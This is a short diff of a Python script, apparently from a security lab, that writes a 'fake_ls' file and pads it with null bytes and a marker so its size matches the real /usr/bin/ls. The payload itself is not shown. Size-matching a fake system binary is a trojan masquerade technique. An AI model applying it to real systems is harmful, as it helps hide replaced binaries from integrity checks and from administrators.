@@ -65,15 +65,14 @@ if __name__ == "__main__":
     """
 
     ls_size = os.path.getsize("/usr/bin/ls")
-    with open("fake_ls", "wb") as f:
-        f.write(bytes(code.encode()))
+    with open("fake_ls", "w") as f:
+        f.write(code)
     new_size = os.path.getsize("fake_ls")
     with open("fake_ls", "ab") as f: # append byte mode
         f.write(b'\x00' * (ls_size - new_size - 4))
         f.write(b'\xaa\xbb\xcc\xdd')
-    # print(new_size)
-    # print("after padding:", os.path.getsize("fake_ls"))
-    # print(ls_size)
+    # print("new size:", new_size)
+    # print("original size:", ls_size)
 
 
 # if __name__ == "__main__":
